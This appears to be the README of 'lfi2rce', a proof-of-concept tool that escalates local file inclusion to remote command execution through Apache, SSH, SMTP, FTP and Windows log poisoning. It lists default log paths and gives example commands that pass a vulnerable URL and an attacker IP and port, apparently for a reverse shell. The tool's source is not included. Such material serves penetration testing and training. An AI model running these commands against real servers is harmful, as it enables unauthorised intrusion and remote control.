# lfi2rce
Local File Inclusion To Remote Command Execution (PoC)  

```
lfi2rce - Local File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*

Usage python3 lfi2rce -u <lfi vulnerable url> -t <poison type> -r <attacker ip> -p <attacker port>

Options:

    -u <url>
    -t <poison type>
    -r <attacker ip address>
    -p <attacker port>

Override default log paths:   (this will follow selected poison type schema)

    -l <log file>

Poison types:

    apache       apache2 log poison          (default path: /var/log/apache2/access.log)
    ssh          ssh log poison              (default path: /var/log/auth.log)
    smtp         smtp log poison             (default path: /var/log/mail.log)
    ftp          ftp log poison              (default path: /var/log/vsftpd.log)
    windows      windows apache log poison   (default path: C:/xampp/apache/logs/access.log)

Examples:

    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache -r 10.0.2.15 -p 1337 -l /var/log/apache2/error.log
    python3 lfi2rce -u "http://ghost.server/index.php?page=" -t ssh -r 10.0.2.15 -p 1337
    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log
    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp -r 10.0.2.15 -p 1337
    python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t windows -r 10.0.2.15 -p 1337
```
